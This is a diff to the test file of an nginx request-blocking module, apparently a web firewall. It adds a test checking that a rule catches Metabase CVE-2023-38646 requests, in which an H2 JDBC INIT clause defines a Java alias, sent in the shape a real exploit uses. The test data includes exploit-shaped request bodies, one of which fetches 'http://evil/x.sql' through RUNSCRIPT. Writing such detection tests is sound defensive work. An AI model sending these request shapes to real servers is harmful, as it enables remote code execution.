@@ -41,8 +41,8 @@ GET /t?p=/webtools/control/main&requirePasswordChange=Y
 # CVE-2023-38646: the H2 connection string runs an INIT script at connect --
 # "INIT=CREATE ALIAS ... AS ..." defines a Java-backed function, the RCE
 # primitive. That INIT clause is the gadget no installer sends; a bare
-# "jdbc:h2:mem:test" DSN is benign (t/05 TEST 73). The rule requires the
-# endpoint, an H2 JDBC DSN, AND the INIT gadget.
+# "jdbc:h2:mem:test" DSN is benign (t/05 TEST 73). The rule requires an H2 JDBC
+# DSN AND the INIT gadget, both of which are in the body here.
 --- config
     location /t { shield block; shield_body on; empty_gif; }
 --- request eval
@@ -64,6 +64,26 @@ category=deserial
 {\"url\":\"/api/setup/validate\",\"conn\":\"jdbc:h2:mem:test;INIT=RUNSCRIPT FROM 'http://evil/x.sql'\"}"
 --- more_headers
 Content-Type: application/json
+--- error_code: 403
+
+=== TEST 4c: Metabase H2 INIT gadget in the REALISTIC split shape (S32-2)
+# The shape a real CVE-2023-38646 exploit sends: the endpoint is the REQUEST
+# TARGET and the H2 INIT gadget is in the JSON body. AND-rule terms must all
+# land in one scan buffer -- the URI and the body are scanned independently --
+# so while "/api/setup/validate" was a term this rule could not fire on the
+# actual exploit at all. TESTs 4/4b passed only because they repeat the
+# endpoint INSIDE the body, which no real attacker does.
+#
+# Probed against a built module before the fix: this request reached upstream.
+--- config
+    location /api/setup/validate { shield block; shield_body on; empty_gif; }
+--- request eval
+"POST /api/setup/validate
+{\"token\":\"x\",\"details\":{\"details\":{\"db\":\"zip:/app/metabase.jar\"},\"engine\":\"h2\"},\"conn\":\"jdbc:h2:mem:test;INIT=CREATE ALIAS EXEC AS \$\$ void e(){} \$\$\"}"
+--- more_headers
+Content-Type: application/json
+--- error_log
+category=deserial
 --- error_code: 403
 
 === TEST 5: time-based SQLi -- sleep( paired with a SELECT
